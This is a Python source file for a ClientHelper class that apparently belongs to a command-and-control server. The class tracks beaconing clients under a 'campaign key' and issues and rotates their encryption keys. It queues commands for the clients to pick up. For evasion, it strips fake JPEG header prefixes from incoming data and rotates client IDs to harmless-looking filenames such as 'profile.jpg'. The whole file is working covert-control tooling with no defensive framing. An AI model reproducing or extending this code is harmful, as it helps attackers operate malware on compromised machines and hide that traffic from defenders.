import os
import base64
import logging
from datetime import datetime
import json
import re
import string
import random

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
        self._load_client_names()
    
    def _load_client_names(self):
        """Load possible client names from client_names.txt file"""
        self.client_names = ["default-img.jpeg"]  # Fallback default
        
        try:
            # Find the client_names.txt file path
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            names_file = os.path.join(script_dir, "helpers", "links", "client_names.txt")
            
            if os.path.exists(names_file):
                with open(names_file, 'r') as f:
                    names = [line.strip() for line in f if line.strip()]
                
                if names:
                    self.client_names = names
                    logger.info(f"Loaded {len(names)} client names from {names_file}")
                else:
                    logger.warning(f"No client names found in {names_file}, using defaults")
            else:
                logger.warning(f"Client names file not found at {names_file}, using defaults")
                # Create some default options
                self.client_names = [
                    "profile.jpg", "document.pdf", "config.json", "data.csv", 
                    "script.js", "style.css", "image.png", "icon.ico"
                ]
        except Exception as e:
            logger.error(f"Error loading client names: {e}")
    
    def identify_client_from_body(self, client_ip, client_id_from_body, system_info_raw=None):
        """
        Identify a client based on client ID provided in request body
        
        Args:
            client_ip: IP address of the client
            client_id_from_body: Client ID extracted from request body
            system_info_raw: Raw system info data (could be encrypted)
            
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        system_info = {}
        newly_identified = False
        first_contact = False
        
        # Use the client ID from the body if provided
        client_id = client_id_from_body
        
        # If no client ID was provided, use IP as fallback
        if not client_id:
            client_id = client_ip
            logger.warning(f"No client ID provided, using IP address {client_ip} as identifier")
        
        # Original client ID (will be updated if needed based on system info)
        original_client_id = client_id
        
        # Process system info if available
        if system_info_raw:
            try:
                # Check for and remove JPEG headers if present
                if isinstance(system_info_raw, str):
                    # Strip JPEG header prefixes (exact match only to avoid breaking the data)
                    if system_info_raw.startswith("0xFFD8FF"):
                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
                        logger.info(f"Removed JPEG header prefix '0xFFD8FF' from data")
                    elif system_info_raw.startswith("FFD8FF"):
                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
                        logger.info(f"Removed JPEG header prefix 'FFD8FF' from data")
                
                # Try to decrypt the system info if it doesn't look like JSON
                system_info_json = system_info_raw
                
                if not isinstance(system_info_raw, dict) and not (isinstance(system_info_raw, str) and system_info_raw.startswith('{')):
                    try:
                        # Try with client-specific key if available
                        if client_id and self._has_unique_key(client_id):
                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id)
                        else:
                            # Fall back to campaign key
                            system_info_json = self.crypto_helper.decrypt(system_info_raw)
                    except Exception as e:
                        logger.warning(f"Could not decrypt system info: {e}")
                        # Try to use it as-is if decryption fails
                
                # Parse the system info JSON
                try:
                    if isinstance(system_info_json, str):
                        system_info_obj = json.loads(system_info_json)
                    else:
                        system_info_obj = system_info_json
                        
                    # Extract properties from system info
                    hostname = system_info_obj.get('Hostname', 'Unknown')
                    ip = system_info_obj.get('IP', client_ip)
                    system_info = system_info_obj
                    
                    logger.info(f"Extracted system info - Hostname: {hostname}, IP: {ip}")
                    
                    # Check for original client ID in system info
                    if 'OriginalClientId' in system_info_obj:
                        reported_original_id = system_info_obj.get('OriginalClientId')
                        logger.info(f"Client reported original ID: {reported_original_id}")
                        
                        # This is a rotated client ID. Use the original for internal tracking.
                        if reported_original_id in self.client_manager.get_clients_info():
                            # Update the client info with the current ID
                            client_info = self.client_manager.get_clients_info()[reported_original_id]
                            
                            # Update the client's current ID in our tracking
                            self.client_manager.update_client_id_mapping(reported_original_id, client_id)
                            
                            # Use original ID for internal tracking
                            original_client_id = reported_original_id
                            logger.info(f"Using original client ID for internal tracking: {original_client_id}")
                        else:
                            logger.warning(f"Original client ID {reported_original_id} not found in client manager")
                except Exception as e:
                    logger.error(f"Error parsing system info: {str(e)}")
                    # Keep client_id but use minimal system info
                    system_info = {"Hostname": "Unknown", "IP": client_ip}
                
                # Check if this is a known client via the current ID
                if client_id in self.client_manager.get_clients_info():
                    logger.info(f"Recognized client by current ID {client_id} from {client_ip}")
                    original_client_id = client_id  # This is likely the original ID
                    
                    # Check if this client needs a key
                    if not self._has_unique_key(client_id):
                        first_contact = True
                
                # Check if we need to find the client by a rotated ID mapping
                elif original_client_id != client_id:
                    # We're already tracking this via original_client_id
                    logger.info(f"Mapped rotated client ID {client_id} to original ID {original_client_id}")
                    
                    if not self._has_unique_key(original_client_id):
                        first_contact = True
                else:
                    newly_identified = True
                    first_contact = True
                    logger.info(f"New client with ID {client_id} from {client_ip}")
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Use client_id from body but minimal system info
                system_info = {"Hostname": "Unknown", "IP": client_ip}
        else:
            # No system info provided, use minimal info
            system_info = {"Hostname": "Unknown", "IP": client_ip}
        
        # Register or update the client with the simplified info
        self.client_manager.add_client(
            ip=client_ip,
            hostname=system_info.get("Hostname", "Unknown"),
            system_info=system_info,
            client_id=original_client_id,  # Use the original ID for internal tracking
            current_id=client_id if original_client_id != client_id else None  # Only set if it's different
        )
        
        return original_client_id, system_info, newly_identified, first_contact
    
    def verify_client(self, client_id, system_info):
        """
        Verify client identity - simplified for the new ID format
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # For our simplified approach, consider clients verified after first contact
        is_verified = True
        confidence = 100.0  # High confidence
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def prepare_client_id_rotation(self, client_id):
        """
        Prepare a client ID rotation command
        
        Returns:
            dict: Client ID rotation command object
        """
        # Select a random client ID from available options
        # Make sure we don't reuse the current one
        current_client_id = None
        
        if client_id in self.client_manager.get_clients_info():
            client_info = self.client_manager.get_clients_info()[client_id]
            current_client_id = client_info.get('current_client_id')
        
        new_client_id = self._generate_new_client_id(exclude=current_client_id)
        
        # Store the mapping between original and current ID
        self.client_manager.update_client_id_mapping(client_id, new_client_id)
        
        # Create client ID rotation command
        rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "client_id_rotation",
            "args": new_client_id
        }
        
        logger.info(f"Client ID rotation command issued for client {client_id} -> {new_client_id}")
        
        return rotation_command
    
    def _generate_new_client_id(self, exclude=None):
        """Generate a new client ID from the available options"""
        available_names = [name for name in self.client_names]
        
        # Remove the excluded ID if provided
        if exclude and exclude in available_names:
            available_names.remove(exclude)
        
        # If we're somehow out of options, generate a random one
        if not available_names:
            random_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
            return f"{random_id}-img.jpeg"
        
        # Select a random name
        return random.choice(available_names)
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier (original ID)
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # If there are no pending commands and client_id is an original ID,
        # check if there are pending commands under a current ID
        if not commands and client_id in self.client_manager.get_clients_info():
            current_id = self.client_manager.get_clients_info()[client_id].get('current_client_id')
            if current_id and current_id != client_id:
                # Check if there are any commands for the current ID
                current_commands = self.client_manager.get_pending_commands(current_id)
                if current_commands:
                    # Transfer commands to the original ID
                    for cmd in current_commands:
                        self.client_manager.add_command(
                            client_id, 
                            cmd.get('command_type', 'unknown'), 
                            cmd.get('args', '')
                        )
                    
                    # Clear commands from the current ID
                    self.client_manager.clear_pending_commands(current_id)
                    
                    # Get updated command list
                    commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        # Check if there's a client ID rotation command and move it after key rotation 
        # (since key rotation needs to happen first)
        has_id_rotation = False
        for i, command in enumerate(commands):
            if command.get('command_type') == 'client_id_rotation':
                has_id_rotation = True
                # If there is a key rotation (which will be at position 0), 
                # move the ID rotation to position 1
                if has_key_operation and i > 1:
                    commands.insert(1, commands.pop(i))
                # If there's no key rotation but the ID rotation isn't at position 0, 
                # move it there
                elif not has_key_operation and i > 0:
                    commands.insert(0, commands.pop(i))
                break
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands 
                                if cmd.get('command_type') != 'key_rotation' 
                                and cmd.get('command_type') != 'client_id_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )